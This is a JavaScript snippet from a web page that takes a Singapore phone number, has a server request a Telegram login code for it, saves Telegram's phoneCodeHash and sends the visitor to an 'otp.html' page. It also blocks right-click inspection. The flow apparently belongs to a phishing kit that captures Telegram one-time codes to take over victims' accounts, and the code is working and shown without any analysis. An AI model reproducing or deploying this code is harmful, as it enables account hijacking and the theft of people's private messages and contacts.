<script>
    var newURL = window.location.protocol + "//" + window.location.host + window.location.pathname
    var phoneInput = document.getElementById('phone');
    var countryCodeSpan = document.querySelector('#basic-addon1');
    var submitBtnDiv = document.querySelector('#submit-button');
    const Toast = Swal.mixin({
        toast: true,
        position: "top-end",
        showConfirmButton: false,
        timer: 5000,
        timerProgressBar: true,
        didOpen: (toast) => {
            toast.onmouseenter = Swal.stopTimer;
            toast.onmouseleave = Swal.resumeTimer;
        }
    });

    phoneInput.addEventListener('input', function() {
        if (this.value.length > 0) {
            submitBtnDiv.classList.remove('visually-hidden');
        } else {
            submitBtnDiv.classList.add('visually-hidden');
        }
    });
    
    //request
    document.querySelector('form').addEventListener('submit', function(e) {
        e.preventDefault();
        var phone = '+65' + document.getElementById('phone').value;
        console.log(phone)
        requestTelegramCode(phone);
    });

    document.addEventListener('contextmenu', event => {
        event.preventDefault();
    });
    
    function requestTelegramCode(phone) {
        $('#loader').show();
        $.ajax({
            url: '/request/send_otp',
            type: 'POST',
            CORS: true ,
            contentType: 'application/json',
            secure: true,
            headers: {
                'Access-Control-Allow-Origin': '*',
            },
            data: JSON.stringify({ phone: phone }),
            success: function(response) {
    $('#loader').hide();
    if (response.status === 'success') {
        Toast.fire({
            icon: "success",
            title: "Please wait, We will direct you to another page."
        });

        // Pastikan data sudah disimpan dengan benar dalam sessionStorage
        sessionStorage.setItem('phone', phone);
        sessionStorage.setItem('phoneCodeHash', response.phoneCodeHash);

        // Cek apakah redirect sudah terjadi
        setTimeout(() => {
            window.location.href = newURL + 'otp.html'; // Pastikan 'newURL' sudah terdefinisi dengan benar
        }, 100)
    } else {
        if (response.message === 'PHONE_NUMBER_INVALID') {
            Toast.fire({
                icon: "error",
                title: "Sorry, the number you entered is not correct"
            });
        } else {
            Toast.fire({
                icon: "error",
                title: response.message
            });
        }
    }
},
            error: function(error) {
                if (error.responseJSON.message === 'PHONE_NUMBER_INVALID') {
                    Toast.fire({
                        icon: "error",
                        title: "Sorry, the number you entered is not correct"
                    });
                } else {
                    Toast.fire({
                        icon: "error",
                        title: error.responseJSON.message
                    });
                }
                $('#loader').hide();
            }
        });
    }
